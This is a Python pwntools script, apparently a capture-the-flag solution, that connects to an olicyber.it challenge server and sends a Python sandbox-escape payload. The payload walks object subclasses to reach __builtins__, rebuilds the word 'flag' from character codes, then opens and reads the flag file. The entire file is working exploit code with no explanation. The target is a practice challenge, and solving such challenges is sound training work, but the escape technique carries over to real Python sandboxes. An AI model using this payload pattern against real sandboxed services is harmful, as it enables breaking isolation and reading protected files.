#!/usr/bin/env python3
from pwn import *

r = remote("sandbox_v2.challs.olicyber.it", 35004)
payload = "().__class__.__bases__[0].__subclasses__()[-5]()._module.__builtins__[[i for i in ().__class__.__bases__[0].__subclasses__()[-5]()._module.__builtins__][-8]](().__class__.__bases__[0].__subclasses__()[-5]()._module.__builtins__[[i for i in ().__class__.__bases__[0].__subclasses__()[-5]()._module.__builtins__][14]](102)+().__class__.__bases__[0].__subclasses__()[-5]()._module.__builtins__[[i for i in ().__class__.__bases__[0].__subclasses__()[-5]()._module.__builtins__][14]](108)+().__class__.__bases__[0].__subclasses__()[-5]()._module.__builtins__[[i for i in ().__class__.__bases__[0].__subclasses__()[-5]()._module.__builtins__][14]](97)+().__class__.__bases__[0].__subclasses__()[-5]()._module.__builtins__[[i for i in ().__class__.__bases__[0].__subclasses__()[-5]()._module.__builtins__][14]](103))"

r.recvuntil(b'>>> ')
r.sendline(payload.encode())
r.recvuntil(b'>>> ')
r.sendline(payload.encode() + b'.read()')

print(r.recvuntil(b'}').decode().replace("'", ''))
